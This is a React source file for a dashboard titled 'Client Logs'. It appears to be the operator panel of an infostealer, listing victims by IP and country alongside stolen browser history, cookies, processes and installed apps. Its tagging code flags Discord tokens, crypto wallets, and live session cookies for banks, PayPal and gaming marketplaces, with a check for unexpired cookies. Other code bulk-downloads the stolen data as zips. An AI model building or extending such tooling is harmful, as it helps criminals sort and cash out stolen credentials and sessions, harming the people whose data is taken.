import React, { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import {
    Table,
    TableBody,
    TableCell,
    TableContainer,
    TableHead,
    TableRow,
    Paper,
    TableSortLabel,
    TextField,
    Box,
    TablePagination,
    Button,
    Toolbar,
    Typography,
    CircularProgress,
    Checkbox,
    Chip,
    useTheme,
} from '@mui/material';
import { visuallyHidden } from '@mui/utils';

const headCells = [
    { id: 'ip', numeric: false, disablePadding: false, label: 'IP' },
    { id: 'country', numeric: false, disablePadding: false, label: 'Country' },
    { id: 'date', numeric: false, disablePadding: false, label: 'Date' },
    { id: 'dataSummary', numeric: false, disablePadding: false, label: 'Data Summary' },
    { id: 'tags', numeric: false, disablePadding: false, label: 'Tags' },
    { id: 'actions', numeric: false, disablePadding: false, label: 'Actions' },
];

// Function to check if a cookie is non-expired
const isCookieNonExpired = (cookie) => {
    if (!cookie || cookie.expires === undefined || cookie.expires === null) {
        // Session cookie or no expiration - consider it non-expired
        return true;
    }
    
    // expires_utc is in microseconds since Windows epoch (1601-01-01)
    // Windows epoch to Unix epoch difference: 11644473600000 milliseconds
    const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
    
    // If expires is 0, it's a session cookie (never expires)
    if (cookie.expires === 0) {
        return true;
    }
    
    try {
        // Convert microseconds to milliseconds, then subtract epoch difference
        const expiresMs = (cookie.expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
        const expiresDate = new Date(expiresMs);
        
        // Validate the date is reasonable
        if (isNaN(expiresDate.getTime())) {
            return true; // If we can't parse it, assume it's valid
        }
        
        // Check if expiration is in the future
        return expiresDate > new Date();
    } catch (e) {
        // If parsing fails, assume it's valid
        return true;
    }
};

// Function to extract tags from log data
const extractTags = (log) => {
    const tags = [];
    const pcData = log.pcData || {};
    
    // Check for Discord tokens
    if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
        tags.push({ label: 'Discord (token)', color: '#5865F2' });
    }
    
    // Check browser history and cookies for sites
    const allUrls = [];
    const historyUrls = [];
    const cookieData = [];
    
    // Extract URLs from browser history
    if (pcData.browserHistory) {
        const history = pcData.browserHistory;
        ['chromeHistory', 'firefoxHistory', 'edgeHistory', 'operaHistory', 'braveHistory'].forEach(browser => {
            if (history[browser] && Array.isArray(history[browser])) {
                history[browser].forEach(entry => {
                    if (entry.url) {
                        const url = entry.url.toLowerCase();
                        allUrls.push(url);
                        historyUrls.push(url);
                    }
                });
            }
        });
    }
    
    // Extract domains from cookies with expiration info
    if (pcData.browserCookies) {
        let cookies = [];
        if (typeof pcData.browserCookies === 'string') {
            try {
                cookies = JSON.parse(pcData.browserCookies);
            } catch (e) {
                // If parsing fails, try to extract domains from string
                const domainMatches = pcData.browserCookies.match(/"domain"\s*:\s*"([^"]+)"/gi);
                if (domainMatches) {
                    domainMatches.forEach(match => {
                        const domain = match.match(/"([^"]+)"/)[1];
                        if (domain) {
                            const url = domain.toLowerCase();
                            allUrls.push(url);
                            cookieData.push({ domain: url, expires: null }); // Can't parse expiration from string
                        }
                    });
                }
            }
        } else if (Array.isArray(pcData.browserCookies)) {
            cookies = pcData.browserCookies;
        }
        
        if (Array.isArray(cookies)) {
            cookies.forEach(cookie => {
                if (cookie.domain || cookie.host) {
                    const domain = (cookie.domain || cookie.host).toLowerCase();
                    allUrls.push(domain);
                    cookieData.push({
                        domain: domain,
                        expires: cookie.expires || cookie.expires_utc || null
                    });
                }
            });
        }
    }
    
    // Site detection patterns - sites that require non-expired cookies
    const cookieRequiredSites = {
        'G2G': ['g2g.com'],
        'G2A': ['g2a.com'],
        'Banking': [
            'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citibank.com', 'usbank.com',
            'pnc.com', 'tdbank.com', 'capitalone.com', 'americanexpress.com', 'discover.com',
            'barclays.com', 'hsbc.com', 'jpmorgan.com', 'morganstanley.com', 'goldmansachs.com',
            'schwab.com', 'fidelity.com', 'vanguard.com', 'etrade.com', 'ally.com',
            'synchrony.com', 'regions.com', 'suntrust.com', 'bbt.com', 'keybank.com',
            'huntington.com', 'fifththird.com', 'm&t.com', 'citizensbank.com', 'td.com',
            'banking.wellsfargo.com', 'onlinebanking.usbank.com', 'secure.bankofamerica.com',
            'secure.chase.com', 'online.citi.com', 'online.pnc.com', 'secure.tdbank.com'
        ]
    };
    
    // Site detection patterns - sites that don't require cookie expiration check
    const sitePatterns = {
        'YouTube': ['youtube.com', 'youtu.be', 'youtube-nocookie.com'],
        'Microsoft': ['microsoft.com', 'office.com', 'outlook.com', 'live.com', 'hotmail.com', 'onedrive.com', 'azure.com', 'microsoftonline.com'],
        'Google': ['google.com', 'gmail.com', 'googlemail.com', 'googletagmanager.com', 'googleapis.com', 'googleusercontent.com'],
        'Facebook': ['facebook.com', 'fb.com', 'messenger.com'],
        'Twitter': ['twitter.com', 'x.com', 't.co'],
        'Instagram': ['instagram.com'],
        'TikTok': ['tiktok.com'],
        'Reddit': ['reddit.com'],
        'Amazon': ['amazon.com', 'amazon.co.uk', 'amazon.de', 'amazon.fr'],
        'Steam': ['steamcommunity.com', 'steampowered.com', 'steam-chat.com'],
        'Epic Games': ['epicgames.com', 'unrealengine.com'],
        'PayPal': ['paypal.com'],
        'GitHub': ['github.com'],
        'Netflix': ['netflix.com'],
        'Spotify': ['spotify.com'],
        'Discord': ['discord.com', 'discordapp.com', 'discord.gg'],
    };
    
    // Check cookie-required sites (only show if non-expired cookies exist)
    Object.keys(cookieRequiredSites).forEach(siteName => {
        const patterns = cookieRequiredSites[siteName];
        const foundInHistory = historyUrls.some(url => {
            return patterns.some(pattern => url.includes(pattern));
        });
        
        // Check if there are non-expired cookies for this site
        const hasNonExpiredCookie = cookieData.some(cookie => {
            const matchesDomain = patterns.some(pattern => cookie.domain.includes(pattern));
            return matchesDomain && isCookieNonExpired(cookie);
        });
        
        // Show tag if found in history OR if there's a non-expired cookie
        if ((foundInHistory || hasNonExpiredCookie) && !tags.some(t => t.label.includes(siteName))) {
            tags.push({ label: siteName, color: siteName === 'Banking' ? '#ef4444' : '#60a5fa' });
        }
    });
    
    // Check for regular sites (from history or cookies, no expiration requirement)
    Object.keys(sitePatterns).forEach(siteName => {
        const patterns = sitePatterns[siteName];
        const found = allUrls.some(url => {
            return patterns.some(pattern => url.includes(pattern));
        });
        if (found && !tags.some(t => t.label.includes(siteName))) {
            tags.push({ label: siteName, color: '#60a5fa' });
        }
    });
    
    // Check for crypto wallets
    if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
        tags.push({ label: 'Crypto Wallet', color: '#f59e0b' });
    }
    
    return tags;
};

function LogsTable() {
    const [logs, setLogs] = useState([]);
    const [error, setError] = useState(null);
    const [loading, setLoading] = useState(true);
    const [filterIp, setFilterIp] = useState('');
    const [filterCountry, setFilterCountry] = useState('');
    const [sortKey, setSortKey] = useState('date');
    const [sortDirection, setSortDirection] = useState('desc');
    const [page, setPage] = useState(0);
    const [rowsPerPage, setRowsPerPage] = useState(10);
    const [selected, setSelected] = useState([]);

    const navigate = useNavigate();
    const theme = useTheme();

    const fetchLogs = useCallback(async () => {
        try {
            setLoading(true);
            const token = localStorage.getItem('authToken');
            
            // Check if token exists
            if (!token) {
                setError('Not authenticated. Please log in again.');
                // Trigger logout
                localStorage.removeItem('authToken');
                localStorage.removeItem('userInfo');
                window.location.reload();
                return;
            }
            
            // Try to load from localStorage first
            const cachedLogs = localStorage.getItem('cachedLogs');
            const cacheTimestamp = localStorage.getItem('cachedLogsTimestamp');
            const now = Date.now();
            const CACHE_DURATION = 5 * 60 * 1000; // 5 minutes
            
            if (cachedLogs && cacheTimestamp && (now - parseInt(cacheTimestamp)) < CACHE_DURATION) {
                try {
                    const parsedLogs = JSON.parse(cachedLogs);
                    setLogs(parsedLogs);
                    setError(null);
                    setLoading(false);
                    // Still fetch in background to update cache
                } catch (e) {
                    console.error('Error parsing cached logs:', e);
                }
            }
            
            const response = await fetch('/api/logs', {
                headers: {
                    'Authorization': `Bearer ${token}`
                }
            });
            
            // Handle authentication errors
            if (response.status === 401 || response.status === 403) {
                // Token expired or invalid - clear it and reload to show login
                localStorage.removeItem('authToken');
                localStorage.removeItem('userInfo');
                localStorage.removeItem('cachedLogs');
                localStorage.removeItem('cachedLogsTimestamp');
                window.location.reload();
                return;
            }
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Server responded with status: ${response.status} - ${errorText}`);
            }
            
            const jsonData = await response.json();
            setLogs(jsonData);
            setError(null);
            
            // Cache the logs (with error handling for quota exceeded)
            try {
                // Limit cache to last 100 logs to avoid quota issues
                const logsToCache = jsonData.slice(0, 100);
                const cacheData = JSON.stringify(logsToCache);
                
                // Check if data is too large (localStorage limit is usually ~5-10MB)
                if (cacheData.length > 4 * 1024 * 1024) { // 4MB limit
                    console.warn('Logs cache too large, skipping cache');
                    // Clean up old cache
                    localStorage.removeItem('cachedLogs');
                    localStorage.removeItem('cachedLogsTimestamp');
                } else {
                    localStorage.setItem('cachedLogs', cacheData);
                    localStorage.setItem('cachedLogsTimestamp', now.toString());
                }
            } catch (e) {
                if (e.name === 'QuotaExceededError' || e.code === 22) {
                    console.warn('localStorage quota exceeded, clearing old cache');
                    // Clear old cache and try again with smaller dataset
                    try {
                        localStorage.removeItem('cachedLogs');
                        localStorage.removeItem('cachedLogsTimestamp');
                        // Try caching just the first 50 logs
                        const logsToCache = jsonData.slice(0, 50);
                        localStorage.setItem('cachedLogs', JSON.stringify(logsToCache));
                        localStorage.setItem('cachedLogsTimestamp', now.toString());
                    } catch (e2) {
                        console.warn('Failed to cache logs:', e2);
                        // Clear all log caches if still failing
                        Object.keys(localStorage).forEach(key => {
                            if (key.startsWith('cachedLog_')) {
                                localStorage.removeItem(key);
                                localStorage.removeItem(`${key}_timestamp`);
                            }
                        });
                    }
                } else {
                    console.warn('Error caching logs:', e);
                }
            }
        } catch (err) {
            console.error("Failed to fetch logs:", err);
            // Don't show error if it's a network error and we're already logged out
            if (!err.message.includes('fetch')) {
                setError(`Error fetching logs: ${err.message}`);
            }
        } finally {
            setLoading(false);
        }
    }, []);

    // Cleanup old cached logs periodically
    useEffect(() => {
        const cleanupOldCache = () => {
            try {
                // Clean up individual log caches older than 1 hour
                const oneHourAgo = Date.now() - (60 * 60 * 1000);
                Object.keys(localStorage).forEach(key => {
                    if (key.startsWith('cachedLog_') && key.endsWith('_timestamp')) {
                        const timestamp = parseInt(localStorage.getItem(key) || '0');
                        if (timestamp < oneHourAgo) {
                            const logKey = key.replace('_timestamp', '');
                            localStorage.removeItem(logKey);
                            localStorage.removeItem(key);
                        }
                    }
                });
            } catch (e) {
                console.warn('Error cleaning up cache:', e);
            }
        };
        
        cleanupOldCache();
        const cleanupInterval = setInterval(cleanupOldCache, 10 * 60 * 1000); // Every 10 minutes
        
        return () => clearInterval(cleanupInterval);
    }, []);

    useEffect(() => {
        fetchLogs();
        const intervalId = setInterval(fetchLogs, 3000);
        return () => clearInterval(intervalId);
    }, [fetchLogs]);

    // Clear selection when filters change
    useEffect(() => {
        setSelected([]);
    }, [filterIp, filterCountry]);

    const handleSort = (property) => {
        const isAsc = sortKey === property && sortDirection === 'asc';
        setSortDirection(isAsc ? 'desc' : 'asc');
        setSortKey(property);
    };

    const handleViewLogDetails = (logId) => {
        navigate(`/log/${logId}`);
    };
    
    const handleDownload = async (logId) => {
        try {
            const response = await fetch(`/api/download/${logId}`);
            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = `${logId}_data.zip`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                alert('Download started successfully!');
            } else {
                alert(`Error: ${response.status} - ${await response.text()}`);
            }
        } catch (err) {
            console.error("Download failed:", err);
            alert("Failed to start download.");
        }
    };

    const handleDownloadSelected = async () => {
        if (selected.length === 0) return;

        try {
            // Download each selected log with a small delay to avoid browser blocking
            for (let i = 0; i < selected.length; i++) {
                const logId = selected[i];
                const response = await fetch(`/api/download/${logId}`);
                if (response.ok) {
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = `${logId}_data.zip`;
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                    
                    // Small delay between downloads to prevent browser blocking
                    if (i < selected.length - 1) {
                        await new Promise(resolve => setTimeout(resolve, 300));
                    }
                } else {
                    console.error(`Failed to download log ${logId}: ${response.status}`);
                }
            }
            
            alert(`Started downloading ${selected.length} log(s). Downloads will appear in your browser's download folder.`);
        } catch (err) {
            console.error("Download failed:", err);
            alert("Failed to download some logs. Check console for details.");
        }
    };

    const handleChangePage = (event, newPage) => {
        setPage(newPage);
        setSelected([]); // Clear selection when changing pages
    };

    const handleChangeRowsPerPage = (event) => {
        setRowsPerPage(parseInt(event.target.value, 10));
        setPage(0);
    };

    const filteredLogs = logs.filter(log => {
        const ipMatch = filterIp === '' || log.ip.toLowerCase().includes(filterIp.toLowerCase());
        const countryMatch = filterCountry === '' || log.country.toLowerCase().includes(filterCountry.toLowerCase());
        return ipMatch && countryMatch;
    });

    const sortedLogs = [...filteredLogs].sort((a, b) => {
        const aValue = a[sortKey];
        const bValue = b[sortKey];

        if (bValue < aValue) {
            return sortDirection === 'desc' ? -1 : 1;
        }
        if (bValue > aValue) {
            return sortDirection === 'desc' ? 1 : -1;
        }
        return 0;
    });

    const handleSelectAllClick = (event) => {
        if (event.target.checked) {
            const newSelected = sortedLogs.map((log) => log.id);
            setSelected(newSelected);
            return;
        }
        setSelected([]);
    };

    const handleSelectClick = (event, logId) => {
        const selectedIndex = selected.indexOf(logId);
        let newSelected = [];

        if (selectedIndex === -1) {
            newSelected = newSelected.concat(selected, logId);
        } else if (selectedIndex === 0) {
            newSelected = newSelected.concat(selected.slice(1));
        } else if (selectedIndex === selected.length - 1) {
            newSelected = newSelected.concat(selected.slice(0, -1));
        } else if (selectedIndex > 0) {
            newSelected = newSelected.concat(
                selected.slice(0, selectedIndex),
                selected.slice(selectedIndex + 1),
            );
        }

        setSelected(newSelected);
    };

    const isSelected = (logId) => selected.indexOf(logId) !== -1;

    const handleDeleteSelected = async () => {
        if (selected.length === 0) return;

        if (!window.confirm(`Are you sure you want to delete ${selected.length} log(s)?`)) {
            return;
        }

        try {
            const token = localStorage.getItem('authToken');
            const response = await fetch('/api/logs/delete', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({ logIds: selected }),
            });

            if (response.ok) {
                const data = await response.json();
                setSelected([]);
                
                // Remove deleted logs from localStorage cache
                const cachedLogs = localStorage.getItem('cachedLogs');
                if (cachedLogs) {
                    try {
                        const parsedLogs = JSON.parse(cachedLogs);
                        const updatedLogs = parsedLogs.filter(log => !selected.includes(log.id));
                        localStorage.setItem('cachedLogs', JSON.stringify(updatedLogs));
                        localStorage.setItem('cachedLogsTimestamp', Date.now().toString());
                    } catch (e) {
                        console.error('Error updating cached logs:', e);
                    }
                }
                
                fetchLogs(); // Refresh the logs list
                // Show success message
                if (data.deletedCount > 0) {
                    console.log(`Successfully deleted ${data.deletedCount} log(s)`);
                }
            } else {
                const errorData = await response.json().catch(() => ({ message: response.statusText }));
                alert(`Error deleting logs: ${errorData.message || response.statusText}`);
            }
        } catch (err) {
            console.error("Delete failed:", err);
            alert("Failed to delete logs.");
        }
    };

    if (error) return (
        <Box sx={{ display: 'flex', justifyContent: 'center', p: 3 }}>
            <Typography color="error">{error}</Typography>
        </Box>
    );

    return (
        <Paper sx={{ width: '100%', mb: 2, backgroundColor: theme.palette.background.paper, border: `1px solid ${theme.palette.divider}`, borderRadius: '12px', overflow: 'hidden' }}>
            <Toolbar>
                <Typography sx={{ flex: '1 1 100%', variant: 'h6', component: 'div', color: theme.palette.primary.main, fontWeight: 600 }}>
                    Client Logs
                </Typography>
                <TextField
                    label="Filter by IP"
                    variant="outlined"
                    size="small"
                    value={filterIp}
                    onChange={(e) => setFilterIp(e.target.value)}
                    sx={{ mr: 2 }}
                />
                <TextField
                    label="Filter by Country"
                    variant="outlined"
                    size="small"
                    value={filterCountry}
                    onChange={(e) => setFilterCountry(e.target.value)}
                    sx={{ mr: 2 }}
                />
                <Button 
                    variant="contained"
                    onClick={handleDownloadSelected}
                    disabled={selected.length === 0}
                    sx={{
                        mr: 1,
                        borderRadius: '8px',
                        minWidth: '140px',
                        height: '40px',
                        padding: '8px 20px',
                        fontSize: '0.875rem',
                        fontWeight: 600,
                        backgroundColor: '#3b82f6',
                        color: '#ffffff',
                        boxShadow: '0 2px 8px rgba(59, 130, 246, 0.3)',
                        '&:hover': {
                            backgroundColor: '#2563eb',
                            boxShadow: '0 4px 12px rgba(59, 130, 246, 0.4)',
                        },
                        '&:disabled': {
                            backgroundColor: theme.palette.background.paper,
                            color: theme.palette.text.disabled || theme.palette.text.secondary,
                            boxShadow: 'none',
                        }
                    }}
                >
                    Download {selected.length > 0 && `(${selected.length})`}
                </Button>
                <Button 
                    variant="contained"
                    onClick={handleDeleteSelected}
                    disabled={selected.length === 0}
                    sx={{
                        borderRadius: '8px',
                        minWidth: '120px',
                        height: '40px',
                        padding: '8px 20px',
                        fontSize: '0.875rem',
                        fontWeight: 600,
                        backgroundColor: '#ef4444',
                        color: '#ffffff',
                        boxShadow: '0 2px 8px rgba(239, 68, 68, 0.3)',
                        '&:hover': {
                            backgroundColor: '#dc2626',
                            boxShadow: '0 4px 12px rgba(239, 68, 68, 0.4)',
                        },
                        '&:disabled': {
                            backgroundColor: theme.palette.background.paper,
                            color: theme.palette.text.disabled || theme.palette.text.secondary,
                            boxShadow: 'none',
                        }
                    }}
                >
                    Delete {selected.length > 0 && `(${selected.length})`}
                </Button>
            </Toolbar>
            <TableContainer>
                {logs.length === 0 ? (
                    <Box sx={{ display: 'flex', justifyContent: 'center', p: 3 }}>
                        {loading ? (
                            <>
                                <CircularProgress sx={{ color: theme.palette.primary.main }} />
                                <Typography sx={{ ml: 2, color: theme.palette.text.secondary }}>Waiting for client logs...</Typography>
                            </>
                        ) : (
                            <Typography sx={{ color: theme.palette.text.secondary }}>No logs yet</Typography>
                        )}
                    </Box>
                ) : (
                    <Table sx={{ minWidth: 750 }} aria-labelledby="tableTitle">
                        <TableHead>
                            <TableRow>
                                <TableCell padding="checkbox">
                                    <Checkbox
                                        color="primary"
                                        indeterminate={selected.length > 0 && selected.length < sortedLogs.length}
                                        checked={sortedLogs.length > 0 && selected.length === sortedLogs.length}
                                        onChange={handleSelectAllClick}
                                        inputProps={{
                                            'aria-label': 'select all logs',
                                        }}
                                        sx={{
                                            color: theme.palette.primary.main,
                                            '&.Mui-checked': {
                                                color: theme.palette.primary.main,
                                            },
                                            '&.MuiCheckbox-indeterminate': {
                                                color: theme.palette.primary.main,
                                            },
                                        }}
                                    />
                                </TableCell>
                                {headCells.map((headCell) => (
                                    <TableCell
                                        key={headCell.id}
                                        align={headCell.numeric ? 'right' : 'left'}
                                        padding={headCell.disablePadding ? 'none' : 'normal'}
                                        sortDirection={sortKey === headCell.id ? sortDirection : false}
                                        sx={{ color: theme.palette.primary.main, fontWeight: 600 }}
                                    >
                                        <TableSortLabel
                                            active={sortKey === headCell.id}
                                            direction={sortKey === headCell.id ? sortDirection : 'asc'}
                                            onClick={() => handleSort(headCell.id)}
                                            sx={{
                                                color: theme.palette.primary.main,
                                                '&:hover': {
                                                    color: theme.palette.primary.light,
                                                },
                                                '&.Mui-active': {
                                                    color: theme.palette.primary.main,
                                                },
                                                '& .MuiTableSortLabel-icon': {
                                                    color: `${theme.palette.primary.main} !important`,
                                                },
                                            }}
                                        >
                                            {headCell.label}
                                            {sortKey === headCell.id ? (
                                                <Box component="span" sx={visuallyHidden}>
                                                    {sortDirection === 'desc' ? 'sorted descending' : 'sorted ascending'}
                                                </Box>
                                            ) : null}
                                        </TableSortLabel>
                                    </TableCell>
                                ))}
                            </TableRow>
                        </TableHead>
                        <TableBody>
                            {sortedLogs.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage).map((log, index) => {
                                const isItemSelected = isSelected(log.id);
                                const labelId = `enhanced-table-checkbox-${index}`;
                                // Use pre-calculated tags from dataSummary if available, otherwise fallback to extraction
                                const tags = (log.dataSummary && log.dataSummary.tags && Array.isArray(log.dataSummary.tags)) 
                                    ? log.dataSummary.tags 
                                    : extractTags(log);

                                return (
                                    <TableRow
                                        hover
                                        onClick={(event) => handleSelectClick(event, log.id)}
                                        role="checkbox"
                                        aria-checked={isItemSelected}
                                        tabIndex={-1}
                                        key={log.id}
                                        selected={isItemSelected}
                                        sx={{
                                            backgroundColor: theme.palette.background.paper,
                                            '&:hover': {
                                                backgroundColor: theme.palette.action.hover || 'rgba(255, 255, 255, 0.03)',
                                            },
                                            '&.Mui-selected': {
                                                backgroundColor: theme.palette.action.selected || `${theme.palette.primary.main}1A`,
                                                '&:hover': {
                                                    backgroundColor: theme.palette.action.selected || `${theme.palette.primary.main}26`,
                                                },
                                            }
                                        }}
                                    >
                                        <TableCell padding="checkbox">
                                            <Checkbox
                                                color="primary"
                                                checked={isItemSelected}
                                                inputProps={{
                                                    'aria-labelledby': labelId,
                                                }}
                                                onClick={(e) => e.stopPropagation()}
                                                sx={{
                                                    color: theme.palette.primary.main,
                                                    '&.Mui-checked': {
                                                        color: theme.palette.primary.main,
                                                    },
                                                }}
                                            />
                                        </TableCell>
                                        <TableCell component="th" id={labelId} scope="row" sx={{ color: theme.palette.text.primary }}>
                                            {log.ip}
                                        </TableCell>
                                        <TableCell sx={{ color: theme.palette.text.secondary }}>{log.country}</TableCell>
                                        <TableCell sx={{ color: theme.palette.text.secondary }}>{new Date(log.date).toLocaleString()}</TableCell>
                                        <TableCell sx={{ color: theme.palette.text.secondary }}>
                                            {`H:${log.dataSummary.historyEntries || 0}, P:${log.dataSummary.processes || 0}, A:${log.dataSummary.installedApps || 0}, C:${log.dataSummary.cookies || 0}`}
                                        </TableCell>
                                        <TableCell>
                                            <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 0.5, maxWidth: '300px' }}>
                                                {tags.length > 0 ? (
                                                    tags.map((tag, tagIndex) => (
                                                        <Chip
                                                            key={tagIndex}
                                                            label={tag.label}
                                                            size="small"
                                                            sx={{
                                                                backgroundColor: tag.color || '#60a5fa',
                                                                color: '#ffffff',
                                                                fontSize: '0.7rem',
                                                                height: '20px',
                                                                fontWeight: 500,
                                                                '& .MuiChip-label': {
                                                                    padding: '0 6px',
                                                                }
                                                            }}
                                                        />
                                                    ))
                                                ) : (
                                                    <Typography variant="body2" sx={{ color: theme.palette.text.disabled || theme.palette.text.secondary, fontStyle: 'italic' }}>
                                                        No tags
                                                    </Typography>
                                                )}
                                            </Box>
                                        </TableCell>
                                        <TableCell>
                                            <Button 
                                                variant="contained" 
                                                onClick={() => handleViewLogDetails(log.id)} 
                                                sx={{ 
                                                    mr: 1,
                                                    backgroundColor: theme.palette.primary.main,
                                                    color: theme.palette.primary.contrastText || '#ffffff',
                                                    borderRadius: '8px',
                                                    fontWeight: 600,
                                                    '&:hover': {
                                                        backgroundColor: theme.palette.primary.dark,
                                                    }
                                                }}
                                            >
                                                View
                                            </Button>
                                            <Button 
                                                variant="outlined" 
                                                onClick={() => handleDownload(log.id)}
                                                sx={{
                                                    borderColor: theme.palette.primary.main,
                                                    color: theme.palette.primary.main,
                                                    borderRadius: '8px',
                                                    fontWeight: 600,
                                                    '&:hover': {
                                                        borderColor: theme.palette.primary.light,
                                                        backgroundColor: `${theme.palette.primary.main}1A`,
                                                    }
                                                }}
                                            >
                                                Download
                                            </Button>
                                        </TableCell>
                                    </TableRow>
                                );
                            })}
                        </TableBody>
                    </Table>
                )}
            </TableContainer>
            <TablePagination
                rowsPerPageOptions={[5, 10, 25]}
                component="div"
                count={filteredLogs.length}
                rowsPerPage={rowsPerPage}
                page={page}
                onPageChange={handleChangePage}
                onRowsPerPageChange={handleChangeRowsPerPage}
            />
        </Paper>
    );
}

export default LogsTable;
